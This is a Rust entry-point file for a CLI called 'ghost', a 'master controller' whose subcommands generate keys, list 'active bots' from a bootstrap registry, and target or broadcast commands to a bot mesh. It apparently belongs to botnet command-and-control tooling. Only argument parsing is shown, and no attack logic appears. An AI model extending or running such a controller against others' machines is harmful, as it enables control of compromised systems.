use clap::{Parser, Subcommand};
use std::path::PathBuf;

mod crypto;
mod network;
mod commands;

#[derive(Parser)]
#[command(name = "ghost")]
#[command(about = "The Ghost Master Controller", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Generate Ghost Identity
    Keygen {
        #[arg(short, long, default_value = "ghost.key")]
        output: PathBuf,
    },
    /// List active bots from Bootstrap Registry
    List {
        #[arg(short, long, default_value = "ws://localhost:8080")]
        bootstrap: String,
    },
    /// Target a specific bot (Not Impl)
    Target {
        #[arg(short, long, default_value = "ws://localhost:8080")]
        bootstrap: String,
        #[arg(short, long, default_value = "ghost.key")]
        key: PathBuf,
        #[arg(long)]
        target: String,
        #[arg(long)]
        cmd: String,
    },
    /// Broadcast Gossip to the Mesh
    Broadcast {
        #[arg(short, long, default_value = "ws://localhost:8080")]
        bootstrap: String,
        #[arg(short, long, default_value = "ghost.key")]
        key: PathBuf,
        #[arg(long)]
        cmd: String,
    },
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();
    match cli.command {
        Commands::Keygen { output } => commands::handle_keygen(output).await,
        Commands::List { bootstrap } => commands::handle_list(bootstrap).await,
        Commands::Target { bootstrap, key, target, cmd } => commands::handle_target(bootstrap, key, target, cmd).await,
        Commands::Broadcast { bootstrap, key, cmd } => commands::handle_broadcast(bootstrap, key, cmd).await,
    }
}
